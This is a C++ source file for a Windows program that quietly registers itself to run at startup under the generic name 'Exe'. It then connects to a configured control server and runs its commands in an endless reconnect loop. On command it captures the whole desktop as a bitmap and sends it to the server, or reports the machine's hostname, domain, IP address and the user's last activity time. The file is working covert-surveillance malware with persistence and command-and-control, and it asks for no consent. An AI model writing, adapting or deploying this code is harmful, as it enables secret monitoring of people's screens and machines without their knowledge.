#include <iostream>
#include "Client.h"
#include "ConfigReader.h"
#include <algorithm>
#include <iostream>
#include <Lmwksta.h>
#include <StrSafe.h>
#include <vector>
#include <thread>
#include <chrono>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <locale>
#include <codecvt>

using namespace std;

int generator = 1;
wstring screenshot(wstring wPath)
{
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    auto path = wPath + L"\\" + to_wstring(generator++) + L".bmp";
    wcout << path << endl;

    hFile = CreateFileW(path.c_str(),
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return L"";
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return path;
}

string getPCName() {
    char pcName[200];
    unsigned long pcNameLen = 200;
    GetComputerNameA(pcName, &pcNameLen);
    return string(pcName);
}

string getPCDomain() {
    CHAR domain[MAX_PATH];
    DWORD size = MAX_PATH;
    string domainName = "";
    if (GetComputerNameExA(ComputerNameDnsDomain, domain, &size))
        domainName = domain;
    return domainName;
}

wstring getExecProgramPath() {
    vector<wchar_t> pathBuffer(MAX_PATH);
    DWORD length = GetModuleFileName(nullptr, pathBuffer.data(), static_cast<DWORD>(pathBuffer.size()));

    if (length == 0 || length == pathBuffer.size()) {
        return L"";
    }

    return wstring(pathBuffer.begin(), pathBuffer.begin() + length);
}

bool addToAurorun(const wstring& programName, const wstring& executablePath) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueEx(hKey, 
        programName.c_str(),
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(executablePath.c_str()),
        (executablePath.size() + 1) * sizeof(wchar_t));
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

string getLastUserActivityTime() {
    LASTINPUTINFO lii;
    auto tp = chrono::system_clock::now();

    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD idleTimeMs = GetTickCount() - lii.dwTime;
        auto now = chrono::system_clock::now();
        auto nowMs = chrono::time_point_cast<chrono::milliseconds>(now);
        tp = nowMs - chrono::milliseconds(idleTimeMs);
    }

    auto timeT = chrono::system_clock::to_time_t(tp);
    tm localTime;
    localtime_s(&localTime, &timeT);
    ostringstream oss;
    oss << put_time(&localTime, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

string getHostIp() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return "";
    }

    char hostName[256];
    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
        std::cerr << "gethostname failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return "";
    }

    addrinfo hints = {};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo* addrInfo = nullptr;
    addrinfo* p = nullptr;
    std::string ipAddress;

    if (getaddrinfo(hostName, nullptr, &hints, &addrInfo) != 0) {
        std::cerr << "getaddrinfo failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return "";
    }

    for (p = addrInfo; p != nullptr; p = p->ai_next) {
        char ipString[INET6_ADDRSTRLEN];
        if (p->ai_family == AF_INET) {
            sockaddr_in* ipv4 = reinterpret_cast<sockaddr_in*>(p->ai_addr);
            inet_ntop(p->ai_family, &(ipv4->sin_addr), ipString, sizeof(ipString));
        }
        else if (p->ai_family == AF_INET6) {
            sockaddr_in6* ipv6 = reinterpret_cast<sockaddr_in6*>(p->ai_addr);
            inet_ntop(p->ai_family, &(ipv6->sin6_addr), ipString, sizeof(ipString));
        }
        else {
            continue;
        }

        ipAddress = ipString;
        break;
    }

    freeaddrinfo(addrInfo);
    WSACleanup();

    return ipAddress;
}

std::string wstrToStr(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

char* readBmp(string filePath, ULONG64* dataSize) {
    // Открываем файл в бинарном режиме
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);

    if (!file) {
        throw std::runtime_error("Не удалось открыть файл.");
    }

    // Получаем размер файла
    std::streamsize fileSize = file.tellg();

    file.seekg(0, std::ios::beg);

    // Выделяем память для данных файла
    char* buffer = new char[fileSize];
    if (!buffer) {
        throw std::runtime_error("Не удалось выделить память.");
    }

    // Читаем данные файла в буфер
    if (!file.read(buffer, fileSize)) {
        delete[] buffer; // Освобождаем память при ошибке
        throw std::runtime_error("Ошибка чтения файла.");
    }

    // Закрываем файл
    file.close();

    // Устанавливаем размер данных
    *dataSize = static_cast<std::size_t>(fileSize);

    return buffer;
}

int main() {
    addToAurorun(L"Exe", getExecProgramPath());

    ConfigReader cr;
    auto conf = cr.read("config.txt");

    string server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
    int server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
    string screenshot_dir = conf["screenshot_dir"];
    string host_name = getPCName();
    string host_domain_name = getPCDomain();
    string lastActiveTime = getLastUserActivityTime();
    string host_ip = getHostIp();

    if (host_domain_name.length() == 0) {
        host_domain_name = "no domain";
    }

    while (true) {

        TCPClient* client = new TCPClient(server_ip, server_port);
        client->connect();

        while (true) {
            try {
                string command = client->receiveMessage();
                cout << command << endl;

                if (command == "GET_SCREENSHOT") {
                    string screen_path = wstrToStr(screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end())));
                    cout << screen_path << endl;
                    ULONG64 size;
                    auto data = readBmp(screen_path, &size);
                    Sleep(20);
                    client->sendMessage(to_string(size));
                    Sleep(20);
                    client->receiveMessage();
                    Sleep(20);
                    client->sendMessage(data, size);
                    Sleep(20);
                    delete[] data;
                    size = 0;


                }
                else if (command == "GET_STATE") {
                    string info = "";
                    info += "hostname: " + host_name + "\n";
                    info += "domain: " + host_domain_name + "\n";
                    info += "last_activ_time: " + getLastUserActivityTime() + "\n";
                    info += "ip: " + host_ip + "\n";

                    client->sendMessage(info);
                }
            }
            catch (const std::exception& e) {
                delete client;
                break;
            }
        }

    }
}